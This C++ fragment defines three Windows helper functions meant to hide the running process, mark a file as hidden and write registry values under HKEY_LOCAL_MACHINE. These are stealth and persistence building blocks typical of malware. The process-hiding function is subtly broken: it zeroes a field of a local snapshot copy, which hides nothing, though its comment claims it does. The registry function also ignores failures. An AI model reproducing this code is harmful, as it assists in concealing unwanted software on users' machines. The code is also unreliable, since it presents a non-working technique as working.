//Function to hide the process
void HideProcess()
{
    //Get the current process ID
    DWORD pid = GetCurrentProcessId();

    //Create a snapshot of the processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    //Check if the snapshot was created
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        cout << "Error: Could not create snapshot" << endl;
        return;
    }

    //Create a PROCESSENTRY32 structure
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    //Loop through the processes
    if (Process32First(hSnapshot, &pe32))
    {
        do
        {
            //Check if the process ID matches the current process
            if (pe32.th32ProcessID == pid)
            {
                //Hide the process
                pe32.dwSize = 0;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    //Close the snapshot
    CloseHandle(hSnapshot);
}

//Function to hide the file
void HideFile(string filename)
{
    //Get the file attributes
    DWORD attribs = GetFileAttributes(filename.c_str());

    //Check if the file exists
    if (attribs == INVALID_FILE_ATTRIBUTES)
    {
        cout << "Error: File does not exist" << endl;
        return;
    }

    //Hide the file
    SetFileAttributes(filename.c_str(), FILE_ATTRIBUTE_HIDDEN);
}

//Function to add a registry key
void AddRegistryKey(string keyName, string valueName, string value)
{
    //Open the registry key
    HKEY hKey;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, keyName.c_str(), 0, KEY_ALL_ACCESS, &hKey);

    //Set the value
    RegSetValueEx(hKey, valueName.c_str(), 0, REG_SZ, (BYTE*)value.c_str(), value.length());

    //Close the registry key
    RegCloseKey(hKey);
}

